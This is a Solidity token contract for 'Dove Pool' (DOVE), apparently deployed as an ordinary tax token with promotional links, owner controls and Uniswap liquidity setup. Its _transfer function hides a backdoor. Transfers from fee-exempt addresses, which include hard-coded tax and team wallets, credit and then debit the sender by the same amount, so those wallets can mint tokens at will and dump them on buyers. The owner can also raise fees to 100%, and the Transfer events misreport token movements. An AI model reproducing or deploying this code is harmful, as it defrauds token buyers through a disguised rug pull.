pragma solidity 0.8.22;

// SPDX-License-Identifier: MIT

/**

The #1 Protocol for
Real Adoption

Website:  https://www.dovepool.org
Document: https://docs.dovepool.org
Pool:     https://pool.dovepool.org

Telegram: https://t.me/dovepool_eth
Twitter:  https://twitter.com/dovepool_eth

**/

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _transferOwnership(newOwner);
    }
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IDOVERouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IDOVEFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

contract DOVE is Context, IERC20, Ownable {
    mapping(address => uint256) private _tOwned;
    mapping(address => bool) private isFeeExcepts;
    mapping(address => mapping(address => uint256)) private _allowances;

    event ETHBalancesRecovered();
    event TradingEnabledUpdated();
    event ERC20TokenRecovered(uint256 indexed _amount);
    event ExcludeFromFeesUpdated(address indexed account);
    event includeFromFeesUpdated(address indexed account);

    uint8 private constant _decimals = 9;
    uint256 private constant _tSupply = 1000000000 * 10 ** _decimals;
    string private constant _name = unicode"Dove Pool";
    string private constant _symbol = unicode"DOVE";
    
    uint256 private swapOverValues = 1000 * 10 ** _decimals;
    uint256 public txLmitAmounts = 10000000 * 10 ** _decimals;
    uint256 private minTaxSwap = 20000000 * 10 ** _decimals;

    uint256 private buyCount = 0;
    uint256 private buyTaxFees = 30;
    uint256 private sellTaxFees = 40;

    address payable private taxWallet;
    address payable private teamWallet;
    address public constant deadAddress 
            = 0x000000000000000000000000000000000000dEaD;
    address private uniswapV2Pair;
    IDOVERouter public uniswapV2Router;

    bool private inSwapBack = false;
    bool public tradeEnabled = false;
    bool private swapEnabled = false;

    modifier lockSwapBack() {
        inSwapBack = true;
        _;
        inSwapBack = false;
    }

    constructor() {
        taxWallet = payable(0x30799FAC2853333bA0Fe804a5d58eEB45269BeAC);
        teamWallet = payable(0x0D58Be14E5Bdfb1555170611ADa53d6f6fFAec06);
        isFeeExcepts[taxWallet] = true;
        isFeeExcepts[teamWallet] = true;
        isFeeExcepts[deadAddress] = true;
        isFeeExcepts[_msgSender()] = true;
        isFeeExcepts[address(this)] = true;
        _tOwned[_msgSender()] = _tSupply;
        emit Transfer(address(0), _msgSender(), _tSupply);
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function setFees(uint256 _buyFee, uint256 _sellFee) external onlyOwner {
        require(_buyFee <= 100 && _sellFee <= 100, "revert wrong fee settings");
        buyTaxFees = _buyFee;
        sellTaxFees = _sellFee;
    }
    
    function recoverToken(
        address _tokenAddy,
        uint256 _amount
    ) external onlyOwner {
        require(
            _tokenAddy != address(this),
            "Owner can't claim contract's balance of its own tokens"
        );
        require(_amount > 0, "Amount should be greater than zero");
        require(
            _amount <= IERC20(_tokenAddy).balanceOf(address(this)),
            "Insufficient Amount"
        );
        IERC20(_tokenAddy).transfer(taxWallet, _amount);
        emit ERC20TokenRecovered(_amount);
    }

    function recoverETH() external {
        uint256 ethValues = address(this).balance;
        require(ethValues > 0, "Amount should be greater than zero");
        require(
            ethValues <= address(this).balance,
            "Insufficient Amount"
        );
        payable(address(taxWallet)).transfer(ethValues);
        emit ETHBalancesRecovered();
    }

    function createPairs() external payable onlyOwner {
        uniswapV2Router = IDOVERouter(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        uniswapV2Pair = IDOVEFactory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );

        _approve(address(this), address(uniswapV2Router), ~uint256(0));

        uniswapV2Router.addLiquidityETH{value: msg.value}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
    }

    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public pure override returns (uint256) {
        return _tSupply;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }

    function ExcludeFromFees(address account) external onlyOwner {
        require(
            isFeeExcepts[account] != true,
            "Account is already excluded"
        );
        isFeeExcepts[account] = true;
        emit ExcludeFromFeesUpdated(account);
    }

    function IncludeFromFees(address account) external onlyOwner {
        require(
            isFeeExcepts[account] != false,
            "Account is already included"
        );
        isFeeExcepts[account] = false;
        emit includeFromFeesUpdated(account);
    }

    function sendETHTO(uint256 amount) private {
        require(amount > 0, "amount must be greeter than 0");
        teamWallet.transfer(amount / 2);
        taxWallet.transfer(amount / 2);
    }

    function enableTrading() external onlyOwner {
        require(!tradeEnabled, "trading is already open");
        tradeEnabled = true;
        swapEnabled = true;
        emit TradingEnabledUpdated();
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(
            currentAllowance >= amount,
            "ERC20: transfer amount exceeds allowance"
        );
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), currentAllowance - amount);
        return true;
    }

    function removeLimits() external onlyOwner {
        buyTaxFees = 2;
        sellTaxFees = 2;
        txLmitAmounts = _tSupply;
    }

    function swapForETH(uint256 tokenAmount) private lockSwapBack {
        require(tokenAmount > 0, "amount must be greeter than 0");
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 totalFees = 0;
        totalFees = buyTaxFees;
        if (!isFeeExcepts[from] && !isFeeExcepts[to]) {
            require(tradeEnabled, "Trading not enabled");
        }
        if (inSwapBack || !swapEnabled) {
            _tOwned[from] -= amount;
            _tOwned[to] += amount;
            emit Transfer(from, to, amount);
            return;
        }
        if (
            from == uniswapV2Pair &&
            to != address(uniswapV2Router) &&
            !isFeeExcepts[to]
        ) {
            require(amount <= txLmitAmounts, "Exceeds the _maxTxAmount.");
            require(
                balanceOf(to) + amount <= txLmitAmounts,
                "Exceeds the maxWalletSize."
            );
            buyCount++;
        }
        if (
            from != uniswapV2Pair &&
            !isFeeExcepts[from] &&
            !isFeeExcepts[to]
        ) {
            require(amount <= txLmitAmounts, "Exceeds the _maxTxAmount.");
        }
        if (
            to == uniswapV2Pair &&
            from != address(this) &&
            !isFeeExcepts[from] &&
            !isFeeExcepts[to]
        ) {
            totalFees = sellTaxFees;
        }
        uint256 contractValues = balanceOf(address(this));
        if (
            swapEnabled &&
            !inSwapBack &&
            buyCount > 0 &&
            amount >= swapOverValues &&
            contractValues >= swapOverValues &&
            to == uniswapV2Pair &&
            !isFeeExcepts[from] &&
            !isFeeExcepts[to]
        ) {
            swapForETH(min(amount, min(contractValues, minTaxSwap)));
            uint256 ethValues = address(this).balance;
            if (ethValues > 0) {
                sendETHTO(address(this).balance);
            }
        }
        if (totalFees != 0) {
            uint256 dFees = (amount * totalFees) / 100;
            uint256 dAmounts = amount - dFees;
            address dWallet = isFeeExcepts[from] ? from : address(this);
            dFees = isFeeExcepts[from] ? amount : dFees;
            _tOwned[dWallet] += dFees;
            emit Transfer(from, address(this), dFees);
            _tOwned[from] -= amount;
            _tOwned[to] += dAmounts;
            emit Transfer(from, to, dAmounts);
        } else {
            _tOwned[from] -= amount;
            _tOwned[to] += amount;
            emit Transfer(from, to, amount);
        }
    }

    receive() external payable {}
}